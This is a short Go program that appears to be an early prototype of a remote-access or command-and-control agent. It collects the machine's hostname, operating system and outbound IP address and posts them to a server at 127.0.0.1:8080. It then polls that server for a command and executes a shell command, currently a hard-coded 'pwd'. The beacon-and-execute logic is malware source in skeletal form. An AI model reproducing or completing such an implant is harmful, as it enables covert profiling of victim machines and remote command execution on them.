package main

import (
    "bytes"
    "encoding/json"
    "fmt"
    "io/ioutil"
	"net/http"
	"net"
	"runtime"
	//"strings"
    "log"
    "os"
    "os/exec"
   

)

func getHostname() string{
    name, err := os.Hostname()
    if err != nil { 
        panic(err)
    }
    return name
}

func getOS() string{ 
	var os string
	if runtime.GOOS == "windows" {
		os = "Windows"
	}else if runtime.GOOS == "linux" { 
		os = "Linux"
	}
	return os

}

func GetOutboundIP() net.IP {
    conn, err := net.Dial("udp", "8.8.8.8:80")
    if err != nil {
        log.Fatal(err)
    }
    defer conn.Close()

    localAddr := conn.LocalAddr().(*net.UDPAddr)

    return localAddr.IP
}

func execute(cmd string) { 
    out, err := exec.Command(cmd).Output()
    if err != nil {
        log.Fatal(err)
    }
    fmt.Println(string(out))
}

func recieveCommand(path string) { 
    resp, err := http.Get(path)
    if err != nil { 
        panic(err)
    }
    defer resp.Body.Close()

    ioutil.ReadAll(resp.Body)

    if err != nil {

        panic(err)
    }

    exec := "pwd"
    
    execute(exec)

}



func main() {
	
	
    reqBody, err := json.Marshal(map[string]string{
        "encryptedkey1": "encrypteddata1",
		"encryptedkey2":    "encrypteddata2",
		
    })
    if err != nil {
        print(err)
	}
	
	os := getOS()
    ip := GetOutboundIP().String()
    host := getHostname()
  
    resp, err := http.Post("http://127.0.0.1:8080/form?os=" + os + "&ip=" + ip  + "&host=" + host,
        "application/json", bytes.NewBuffer(reqBody))
    if err != nil {
        print(err)
    }
    
    defer resp.Body.Close()
    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        print(err)
    }
    fmt.Println(string(body))
    recieveCommand("http://127.0.0.1:8080/hello")

}
